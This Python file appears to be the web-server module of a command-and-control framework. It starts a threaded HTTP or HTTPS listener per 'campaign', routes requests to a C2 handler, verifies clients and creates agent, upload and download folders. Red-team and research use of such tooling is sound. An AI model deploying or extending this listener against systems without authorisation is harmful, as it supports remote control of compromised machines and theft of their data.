import socketserver
import threading
import os
import ssl
from core.key_manager import KeyManager
from core.crypto_utils import CryptoManager
from core.utils.client_identity import ClientVerifier
from core.utils.c2_handler import C2RequestHandler

class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """This server handles each request in a separate thread."""
    daemon_threads = True  # ensures threads exit when main thread does

# Global variable to hold the server instance
httpd = None

def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ssl=False, cert_path=None, key_path=None):
    """Starts the web server in a separate thread."""
    global httpd
    try:
        # If campaign_name is not provided, try to determine it
        if not campaign_name:
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default_campaign"
        
        campaign_folder = f"{campaign_name}_campaign"
        
        # Create crypto manager for this campaign
        crypto_manager = CryptoManager(campaign_name)
        
        # Create client verifier for this campaign
        client_verifier = ClientVerifier(campaign_folder)
        
        # Set up the server with the handler
        handler = lambda *args: C2RequestHandler(
            *args, 
            client_manager=client_manager, 
            logger=logger, 
            crypto_manager=crypto_manager, 
            campaign_name=campaign_name
        )
        
        # Create server
        httpd = ThreadedHTTPServer((ip, port), handler)
        
        # Attach the client verifier to the server
        httpd.client_verifier = client_verifier
        
        # Configure SSL if requested
        if use_ssl and cert_path and key_path:
            if os.path.exists(cert_path) and os.path.exists(key_path):
                try:
                    httpd.socket = ssl.wrap_socket(
                        httpd.socket,
                        certfile=cert_path,
                        keyfile=key_path,
                        server_side=True
                    )
                    logger(f"SSL enabled with certificate {cert_path} and key {key_path}")
                except ssl.SSLError as e:
                    logger(f"SSL configuration failed: {e}")
                    raise
            else:
                logger("SSL certificate or key file not found, continuing without SSL")
        
        # Start the server in a separate thread
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True  # Allow the main program to exit even if the server is running
        server_thread.start()
        
        # Log server startup
        protocol = "https" if use_ssl and cert_path and key_path else "http"
        logger(f"Webserver started at {protocol}://{ip}:{port} for campaign '{campaign_name}'")
        logger(f"All traffic will be encrypted using AES-256-CBC with pre-shared keys")
        
        # Create necessary campaign directories
        os.makedirs(os.path.join(campaign_folder, "uploads"), exist_ok=True)
        os.makedirs(os.path.join(campaign_folder, "agents"), exist_ok=True)
        os.makedirs(os.path.join(campaign_folder, "downloads"), exist_ok=True)
        
        return server_thread
    except Exception as e:
        logger(f"Error starting webserver: {e}")
        raise
    
def stop_webserver():
    """Stops the web server."""
    global httpd
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        httpd = None